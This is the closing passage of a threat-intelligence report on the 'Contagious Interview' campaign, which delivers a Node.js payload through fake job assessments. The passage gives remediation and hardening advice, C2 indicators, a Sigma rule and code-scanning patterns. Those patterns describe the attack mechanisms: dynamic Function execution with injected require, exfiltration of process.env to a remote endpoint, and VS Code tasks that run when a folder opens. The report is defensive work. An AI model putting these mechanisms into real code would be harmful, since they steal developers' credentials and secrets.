- Do not rely on AV or EDR detection - the payload executes as JavaScript inside a legitimate `node` process and will not match known malware signatures
- Review browser-stored credentials and session tokens if the compromised machine was used for authenticated sessions after execution
- If any cryptocurrency wallet seed phrases or private keys were accessible from the environment, treat them as compromised and migrate funds immediately
- Reimage from a known-good backup or clean OS install once forensic preservation is complete

### Network-Level Detection

- Block and alert on outbound connections to `174.138.188[.]80` on all ports, especially TCP/3000
- Create IDS rules for HTTP GET requests matching `/api/errorMessage` with parameter `exceptionId=env070722`
- Alert on outbound HTTP plaintext connections originating from `node` processes on non-standard high ports
- Monitor for outbound POST requests to `*.vercel.app` paths ending in `/api` from Node.js processes, particularly with header `x-app-request: ip-check`

Defanged indicators are used throughout the public report. Refang values before deploying detection logic.

**Sigma rule (conceptual):**

```yaml
title: Contagious Interview C2 Beacon - env070722
status: experimental
logsource:
  category: network_connection
detection:
  selection:
    DestinationIp: '174.138.188[.]80'
    DestinationPort: 3000
  condition: selection
falsepositives:
  - None expected
level: critical
```

**Source-code detection opportunities:**

```yaml
rules:
  - id: node-dynamic-function-with-require
    message: Dynamic JavaScript execution with injected require in Node.js project
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern: new Function('require', $PAYLOAD)(require)

  - id: env-exfiltration-to-remote-endpoint
    message: Runtime environment object sent to remote endpoint
    severity: ERROR
    languages: [javascript, typescript]
    patterns:
      - pattern-either:
          - pattern: axios.post($URL, { ...process.env }, ...)
          - pattern: fetch($URL, { ..., body: JSON.stringify({ ...process.env }), ... })

  - id: vscode-folderopen-task
    message: VS Code task executes automatically on folder open
    severity: WARNING
    languages: [json]
    pattern: '"runOn": "folderOpen"'
```

### Host-Level Hardening

- Set `task.allowAutomaticTasks` to `off` or `prompt` in VS Code user settings to prevent `runOn: folderOpen` tasks from executing silently
- Review `.vscode/tasks.json` before opening any unknown repository in VS Code; inspect specifically for `runOn: folderOpen` and any shell commands referencing remote URLs
- Audit `prepare`, `postinstall`, and `preinstall` scripts in `package.json` before running `npm install` in unfamiliar projects
- Run technical assessments from unknown sources inside an isolated VM or container with no access to host credentials, no mounted credential files, and filtered network egress
- Use a dedicated assessment environment with no host secrets, no mounted credential files, and no real `.env` or `.env.local` values. When possible, inspect package scripts first and run dependency installation with script execution disabled, for example `npm install --ignore-scripts`, before deciding whether any project script should run.

---

---

*TLP:CLEAR - This report may be freely shared. Attribution assessments are tentative and based on TTP similarity only. All IOCs are provided for defensive purposes.*

*Report ID: TP-2026-002 | Published: 2026-02-25 | Author: [ThreatProphet](https://threatprophet.com)*
